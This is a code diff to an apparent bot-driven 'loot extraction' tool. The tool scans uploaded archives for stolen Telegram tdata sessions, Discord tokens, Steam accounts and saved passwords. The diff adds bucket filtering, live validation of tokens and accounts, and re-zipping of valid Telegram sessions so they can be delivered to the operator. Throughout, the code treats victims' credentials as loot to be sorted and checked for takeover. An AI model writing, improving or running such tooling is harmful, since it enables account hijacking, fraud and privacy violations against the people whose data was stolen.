@@ -201,29 +201,53 @@ def _render_summary(
     archive_name: str,
     duration_s: float,
     validated: bool,
+    buckets: "frozenset[str] | None" = None,
 ) -> str:
     valid_tdata = sum(1 for a in result.tdata if a.valid)
     live_discord = sum(1 for t in result.discord if t.valid is True)
     dead_discord = sum(1 for t in result.discord if t.valid is False)
+    unknown_discord = sum(1 for t in result.discord if t.valid is None)
     live_steam = sum(1 for a in result.steam if a.valid is True)
     domains = sorted({c.domain for c in result.credentials if c.domain})
+
+    run_all = not buckets
+    show_tdata = run_all or (buckets and LOOT_TDATA in buckets)
+    show_discord = run_all or (buckets and LOOT_DISCORD in buckets)
+    show_steam = run_all or (buckets and LOOT_STEAM in buckets)
+    show_passwords = run_all or (buckets and LOOT_PASSWORDS in buckets)
+
     lines = [
         "=== LOOT SUMMARY ===",
         f"Archive            : {archive_name}",
         f"Scan duration      : {duration_s:.1f} s",
         f"Validation         : {'on' if validated else 'off'}",
         "",
-        f"tdata accounts     : {len(result.tdata)} "
-        f"({valid_tdata} structurally valid)",
-        f"Discord tokens     : {len(result.discord)} "
-        f"({live_discord} live, {dead_discord} dead)" if validated else
-        f"Discord tokens     : {len(result.discord)}",
-        f"Steam accounts     : {len(result.steam)} "
-        f"({live_steam} live)" if validated else
-        f"Steam accounts     : {len(result.steam)}",
-        f"Credentials        : {len(result.credentials)}",
-        f"Unique domains     : {len(domains)}",
     ]
+    if show_tdata:
+        lines.append(
+            f"tdata accounts     : {len(result.tdata)} "
+            f"({valid_tdata} structurally valid)"
+        )
+    if show_discord:
+        if validated:
+            lines.append(
+                f"Discord tokens     : {len(result.discord)} "
+                f"({live_discord} live, {dead_discord} dead, "
+                f"{unknown_discord} unknown)"
+            )
+        else:
+            lines.append(f"Discord tokens     : {len(result.discord)}")
+    if show_steam:
+        if validated:
+            lines.append(
+                f"Steam accounts     : {len(result.steam)} "
+                f"({live_steam} live)"
+            )
+        else:
+            lines.append(f"Steam accounts     : {len(result.steam)}")
+    if show_passwords:
+        lines.append(f"Credentials        : {len(result.credentials)}")
+        lines.append(f"Unique domains     : {len(domains)}")
     if result.errors:
         lines.append("")
         lines.append("=== ERRORS ===")
@@ -283,19 +307,37 @@ def _stage_outputs(
     duration_s: float,
     settings: LootExtractionConfig,
 ) -> None:
-    """Materialise the loot result into ``loot_out_dir``."""
+    """Materialise the loot result into ``loot_out_dir``.
+
+    Only structurally-valid tdata accounts get re-zipped — invalid /
+    half-corrupt sessions go into ``tdata/REJECTED.txt`` so the user
+    isn't shipped a zip full of broken sessions. Set
+    ``LOOT_KEEP_INVALID_TDATA=1`` in the environment to include them
+    anyway.
+    """
+    keep_invalid = bool(
+        getattr(config, "LOOT_KEEP_INVALID_TDATA", False),
+    )
+
     # ── summary ──────────────────────────────────────────────────
     summary = _render_summary(
         result,
         archive_name=archive_name,
         duration_s=duration_s,
         validated=settings.validate,
+        buckets=settings.buckets,
     )
     _write_text(os.path.join(loot_out_dir, "loot_summary.txt"), summary)
 
     # ── tdata accounts (one folder per account) ─────────────────
     used_labels: dict[str, int] = {}
+    rejected: List[str] = []
     for idx, acc in enumerate(result.tdata):
+        if not acc.valid and not keep_invalid:
+            rejected.append(
+                f"{_account_label(acc, idx)}: {acc.reason or 'invalid'}"
+            )
+            continue
         label = _account_label(acc, idx)
         used_labels[label] = used_labels.get(label, 0) + 1
         if used_labels[label] > 1:
@@ -307,13 +349,26 @@ def _stage_outputs(
             _zip_tdata_folder(acc.root, os.path.join(acc_dir, "tdata.zip"))
         except Exception:
             logger.exception("Failed to zip tdata folder at {}", acc.root)
+    if rejected:
+        _write_text(
+            os.path.join(loot_out_dir, "tdata", "REJECTED.txt"),
+            "Sessions that failed structural validation and were not "
+            "bundled (re-run with LOOT_KEEP_INVALID_TDATA=1 to keep "
+            "them):\n\n" + "\n".join(rejected) + "\n",
+        )
 
     # ── tokens ───────────────────────────────────────────────────
-    discord_text = _render_discord_lines(result.discord)
-    _write_text(os.path.join(loot_out_dir, "discord_tokens.txt"), discord_text)
+    if result.discord:
+        discord_text = _render_discord_lines(result.discord)
+        _write_text(
+            os.path.join(loot_out_dir, "discord_tokens.txt"), discord_text,
+        )
 
-    steam_text = _render_steam_lines(result.steam)
-    _write_text(os.path.join(loot_out_dir, "steam_accounts.txt"), steam_text)
+    if result.steam:
+        steam_text = _render_steam_lines(result.steam)
+        _write_text(
+            os.path.join(loot_out_dir, "steam_accounts.txt"), steam_text,
+        )
 
     # ── credentials ──────────────────────────────────────────────
     if result.credentials:
@@ -377,21 +432,32 @@ def _run_loot_extraction(
             )
 
         progress.phase = "scanning"
+        # Reset dashboard state for this scan so a previous /loot run
+        # doesn't bleed counters into the live message.
+        progress.loot_bucket = ""
+        progress.loot_counts = {}
+        progress.loot_valid_counts = {}
+        progress.loot_validate_total = 0
+        progress.loot_validate_done = 0
         result = loot_mod.scan_directory_for_loot(
-            temp_dir, buckets=settings.buckets or None,
+            temp_dir,
+            buckets=settings.buckets or None,
+            progress=progress,
         )
         progress.files_scanned = result.scanned_files or 0
 
         # Network validation runs in the same thread via asyncio.run
         # because the rest of the loot pipeline is synchronous. The
         # async wrapper above bypasses this when validate is disabled.
-        if settings.validate:
+        if settings.validate and (result.discord or result.steam):
+            progress.phase = "validating"
             try:
                 asyncio.run(
                     loot_mod.validate_loot_async(
                         result,
                         validate_discord=settings.validate_discord,
                         validate_steam=settings.validate_steam,
+                        progress=progress,
                     )
                 )
             except Exception:
